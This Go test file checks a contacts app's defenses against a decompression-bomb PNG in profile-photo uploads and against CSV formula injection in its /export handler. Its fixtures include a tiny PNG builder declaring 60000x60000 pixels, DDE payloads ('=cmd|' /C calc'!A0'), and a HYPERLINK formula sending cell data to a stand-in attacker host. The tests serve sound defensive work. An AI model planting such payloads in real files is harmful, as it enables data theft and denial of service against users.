package controllers

// Issue #375: end-to-end hostile-input coverage that drives the real HTTP
// pipeline (real database.InitDB-migrated schema, real temp storage dirs,
// real middleware.DefaultBodySizeLimitMiddleware in front of the handler --
// not the helper functions called directly) rather than testing helpers in
// isolation. Complements:
//   - TestAttachmentRejectsSVGAndHTML / TestAttachmentPolyglotMislabeledContentSniffed
//     (attachment_real_db_test.go) -- polyglot/mislabeled upload rejection.
//   - TestAttachmentTraversalFilenameNeutralized (attachment_real_db_test.go)
//     -- "../" filenames stored under a randomized name.
//   - photostore/decompression_bomb_test.go -- the dimension guard itself
//     and its wiring into the CardDAV/VCF-import photo path.
//
// This file covers the two pieces those don't: a decompression bomb through
// the direct profile-photo upload/resize path, and formula-injection CSV
// export neutralized on the wire through the real /export handler.

import (
	"bytes"
	"encoding/binary"
	"encoding/csv"
	"hash/crc32"
	"image"
	"image/png"
	"mime/multipart"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"testing"

	"mycorrhizal/config"
	"mycorrhizal/database"
	"mycorrhizal/middleware"
	"mycorrhizal/models"

	"github.com/gin-gonic/gin"
	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
)

// realTinyPNG returns a minimal, fully valid 2x2 PNG -- used across this
// package's E2E tests as an "ordinary, must still succeed" control case.
func realTinyPNG(t *testing.T) []byte {
	t.Helper()
	img := image.NewRGBA(image.Rect(0, 0, 2, 2))
	var buf bytes.Buffer
	require.NoError(t, png.Encode(&buf, img))
	return buf.Bytes()
}

// bombPNG builds a PNG with a valid signature + IHDR chunk declaring
// width x height and nothing else (no IDAT, no pixel data). A real decode
// would fail on the resulting truncated stream, but image.DecodeConfig --
// which only needs to read IHDR -- succeeds and reports the declared,
// attacker-controlled dimensions. That is exactly the shape of a
// decompression bomb: tiny on the wire, huge once a naive decoder
// allocates the full raster from those dimensions. See
// photostore/decompression_bomb_test.go for the identical builder (same
// package-local duplication style already used by cropToSquare across
// photostore.go and photo_controller.go) and its hand-verified proof that
// disabling the guard flips this from "guard-specific error" to "unrelated
// png format error" rather than to a clean success -- i.e. the guard, not
// coincidence, is what refuses this file.
func bombPNG(width, height uint32) []byte {
	var buf bytes.Buffer
	buf.Write([]byte{0x89, 'P', 'N', 'G', '\r', '\n', 0x1a, '\n'})
	writeChunk := func(typ string, data []byte) {
		var lenBuf [4]byte
		binary.BigEndian.PutUint32(lenBuf[:], uint32(len(data)))
		buf.Write(lenBuf[:])
		buf.WriteString(typ)
		buf.Write(data)
		crc := crc32.NewIEEE()
		crc.Write([]byte(typ))
		crc.Write(data)
		var crcBuf [4]byte
		binary.BigEndian.PutUint32(crcBuf[:], crc.Sum32())
		buf.Write(crcBuf[:])
	}
	ihdr := make([]byte, 13)
	binary.BigEndian.PutUint32(ihdr[0:4], width)
	binary.BigEndian.PutUint32(ihdr[4:8], height)
	ihdr[8] = 8 // bit depth
	ihdr[9] = 2 // color type: truecolor
	// compression/filter/interlace already zero, the only valid value
	writeChunk("IHDR", ihdr)
	writeChunk("IEND", nil)
	return buf.Bytes()
}

// postMultipartFile posts a single-file multipart form to path under
// fieldName and returns the recorded response.
func postMultipartFile(t *testing.T, router *gin.Engine, path, fieldName, filename, contentType string, data []byte) *httptest.ResponseRecorder {
	t.Helper()
	var buf bytes.Buffer
	w := multipart.NewWriter(&buf)
	part, err := w.CreateFormFile(fieldName, filename)
	require.NoError(t, err)
	_, err = part.Write(data)
	require.NoError(t, err)
	require.NoError(t, w.Close())

	req, _ := http.NewRequest(http.MethodPost, path, &buf)
	req.Header.Set("Content-Type", w.FormDataContentType())
	_ = contentType // the multipart part's own Content-Type is fixed at "application/octet-stream" by CreateFormFile; the handlers under test sniff real bytes rather than trust it, which is exactly what's being proven elsewhere in this suite.
	rec := httptest.NewRecorder()
	router.ServeHTTP(rec, req)
	return rec
}

// multipartFileHeader builds a real *multipart.FileHeader the way an actual
// upload would produce one (via http.Request.ParseMultipartForm), for tests
// that call an unexported handler-internal function directly.
func multipartFileHeader(t *testing.T, fieldName, filename string, data []byte) *multipart.FileHeader {
	t.Helper()
	var buf bytes.Buffer
	w := multipart.NewWriter(&buf)
	part, err := w.CreateFormFile(fieldName, filename)
	require.NoError(t, err)
	_, err = part.Write(data)
	require.NoError(t, err)
	require.NoError(t, w.Close())

	req, _ := http.NewRequest(http.MethodPost, "/", &buf)
	req.Header.Set("Content-Type", w.FormDataContentType())
	require.NoError(t, req.ParseMultipartForm(10<<20))
	files := req.MultipartForm.File[fieldName]
	require.Len(t, files, 1)
	return files[0]
}

// TestProcessAndSavePhoto_DecompressionBombRefused pins the dimension guard
// specifically (not just "some error happened") at the profile-photo upload
// path's own decode function, the same way
// photostore/decompression_bomb_test.go pins it for the CardDAV/import path.
// Hand-verified: commenting out photostore.CheckImageDimensions's call in
// processAndSavePhoto changes the error to an unrelated png "chunk out of
// order" format error (this bomb has no IDAT), which does not contain this
// substring -- so this test would catch that regression even though the
// broader HTTP-level test below cannot (see its comment).
func TestProcessAndSavePhoto_DecompressionBombRefused(t *testing.T) {
	bomb := bombPNG(60000, 60000)
	require.Less(t, len(bomb), 100, "sanity: the bomb is tiny on the wire")

	_, _, err := processAndSavePhoto(multipartFileHeader(t, "photo", "photo.png", bomb), t.TempDir())
	require.Error(t, err)
	assert.Contains(t, err.Error(), "dimensions too large")
}

// TestAddPhotoToContact_DecompressionBombRefused is the E2E case for the
// direct profile-photo upload path (controllers/photo_controller.go's
// AddPhotoToContact -> processAndSavePhoto -> photostore.CheckImageDimensions),
// driven through the real HTTP pipeline (body-size middleware, multipart
// parsing, contact lookup) rather than calling processAndSavePhoto directly.
// A PNG that declares 60000x60000 (3.6 billion pixels, ~14GB were it
// actually decoded to an RGBA raster) but is 45 bytes on the wire must be
// refused, and refused fast -- this test's own sub-second runtime is itself
// part of the evidence no such allocation was attempted.
//
// This test alone does not distinguish "refused by the dimension guard"
// from "coincidentally failed decode for an unrelated reason" (this
// specific bomb has no IDAT, so a real Decode would error either way) --
// that specificity is what TestProcessAndSavePhoto_DecompressionBombRefused
// above and photostore/decompression_bomb_test.go's
// TestSaveContactPhoto_DecompressionBombRefused pin, each hand-verified
// against exactly that ambiguity. What this test adds is proof the guard is
// actually reachable through the full request path end-to-end.
func TestAddPhotoToContact_DecompressionBombRefused(t *testing.T) {
	db, err := database.InitDB(filepath.Join(t.TempDir(), "photo-bomb-test.db"))
	require.NoError(t, err)
	user := models.User{Username: "photobomb", Password: "password123!A", Email: "photobomb@example.com"}
	require.NoError(t, db.Create(&user).Error)
	contact := models.Contact{UserID: user.ID, Firstname: "Ada"}
	require.NoError(t, db.Create(&contact).Error)

	photoDir := t.TempDir()
	cfg := config.Config{ProfilePhotoDir: photoDir}

	gin.SetMode(gin.ReleaseMode)
	router := gin.Default()
	router.MaxMultipartMemory = 10 << 20
	router.Use(middleware.DefaultBodySizeLimitMiddleware())
	router.Use(func(c *gin.Context) {
		c.Set("db", db)
		c.Set("userID", user.ID)
		c.Set("cfg", cfg)
		c.Next()
	})
	router.POST("/contacts/:id/profile_picture", func(c *gin.Context) { AddPhotoToContact(c, &cfg) })

	bomb := bombPNG(60000, 60000)
	require.Less(t, len(bomb), 100, "sanity: the bomb is tiny on the wire")

	path := "/contacts/" + itoa2(contact.ID) + "/profile_picture"
	rec := postMultipartFile(t, router, path, "photo", "photo.png", "image/png", bomb)
	assert.Equal(t, http.StatusBadRequest, rec.Code, "a declared-oversized image must be rejected: %s", rec.Body.String())

	var reloaded models.Contact
	require.NoError(t, db.First(&reloaded, contact.ID).Error)
	assert.Empty(t, reloaded.Photo, "a rejected upload must not attach a photo to the contact")

	entries, err := os.ReadDir(photoDir)
	require.NoError(t, err)
	assert.Empty(t, entries, "a rejected upload must not leave a file on disk")

	// The guard isn't just refusing everything: an ordinary small photo
	// through the identical path still succeeds.
	rec = postMultipartFile(t, router, path, "photo", "photo.png", "image/png", realTinyPNG(t))
	assert.Equal(t, http.StatusOK, rec.Code, rec.Body.String())
}

// TestExportData_CSVFormulaInjectionNeutralized is the E2E case for the CSV
// formula-injection defense (export_csv_injection_test.go's TestCsvSafe*
// pin csvSafe as a pure function; this drives the same defense through the
// real /export handler against real DB rows and real custom-field
// definitions, which is where a hostile value actually originates -- CardDAV
// sync or VCF/CSV import, not a test calling csvSafe directly).
func TestExportData_CSVFormulaInjectionNeutralized(t *testing.T) {
	db, err := database.InitDB(filepath.Join(t.TempDir(), "export-csv-test.db"))
	require.NoError(t, err)
	user := models.User{Username: "csvexport", Password: "password123!A", Email: "csvexport@example.com"}
	require.NoError(t, db.Create(&user).Error)

	// A hostile custom-field definition (label AND value) plus hostile
	// built-in text columns -- every leading-character payload csvSafe
	// recognizes, spread across different columns so a regression in any
	// one column's plumbing (not just csvSafe itself) shows up.
	def := models.FieldDefinition{
		UserID: user.ID,
		Label:  `=HYPERLINK("http://attacker/?d="&A1,"click")`,
		Key:    "hostile_field",
		Target: models.FieldDefinitionTargetContact,
		Type:   models.FieldTypeString,
	}
	require.NoError(t, db.Create(&def).Error)

	contact := models.Contact{
		UserID:    user.ID,
		Firstname: "=cmd|' /C calc'!A0",
		Lastname:  "+1+1",
		Nickname:  "-1+1",
		HowWeMet:  "@SUM(A1:A9)",
	}
	require.NoError(t, db.Create(&contact).Error)

	fv := models.FieldValue{
		UserID:            user.ID,
		FieldDefinitionID: def.ID,
		EntityID:          contact.VCardUID,
		Value:             []byte(`"=cmd|' /C notepad'!A0"`),
	}
	require.NoError(t, db.Create(&fv).Error)

	gin.SetMode(gin.ReleaseMode)
	router := gin.Default()
	router.Use(middleware.DefaultBodySizeLimitMiddleware())
	router.Use(func(c *gin.Context) {
		c.Set("db", db)
		c.Set("userID", user.ID)
		c.Next()
	})
	router.GET("/export", ExportData)

	req, _ := http.NewRequest(http.MethodGet, "/export", nil)
	rec := httptest.NewRecorder()
	router.ServeHTTP(rec, req)
	require.Equal(t, http.StatusOK, rec.Code, rec.Body.String())
	assert.Equal(t, "text/csv; charset=utf-8", rec.Header().Get("Content-Type"))

	body := rec.Body.Bytes()
	marker := []byte("=== CONTACTS ===\n")
	idx := bytes.Index(body, marker)
	require.NotEqual(t, -1, idx, "expected a CONTACTS section: %s", string(body))
	section := body[idx+len(marker):]

	reader := csv.NewReader(bytes.NewReader(section))
	header, err := reader.Read()
	require.NoError(t, err)
	col := func(name string) int {
		for i, h := range header {
			if h == name {
				return i
			}
		}
		t.Fatalf("column %q not found in header %v", name, header)
		return -1
	}
	// The hostile field-definition label itself must be neutralized in the
	// header row too (issue comment in export_controller.go: "the header
	// row gets the same csvSafe treatment as the data rows").
	assert.True(t, bytes.HasPrefix([]byte(header[col(`'=HYPERLINK("http://attacker/?d="&A1,"click")`)]), []byte("'")))

	record, err := reader.Read()
	require.NoError(t, err)

	// On the wire, every hostile value must carry the leading single-quote
	// marker (never a bare "=", "+", "-", or "@"), and the wrapping CSV
	// quoting/escaping must still round-trip correctly (proven by
	// csv.Reader successfully parsing the record at all).
	assert.Equal(t, "'=cmd|' /C calc'!A0", record[col("Firstname")])
	assert.Equal(t, "'+1+1", record[col("Lastname")])
	assert.Equal(t, "'-1+1", record[col("Nickname")])
	assert.Equal(t, "'@SUM(A1:A9)", record[col("How We Met")])
	assert.Equal(t, "'=cmd|' /C notepad'!A0", record[col(`'=HYPERLINK("http://attacker/?d="&A1,"click")`)])

	// Ordinary data is untouched.
	assert.NotContains(t, record[col("Firstname")], "\x00")
}
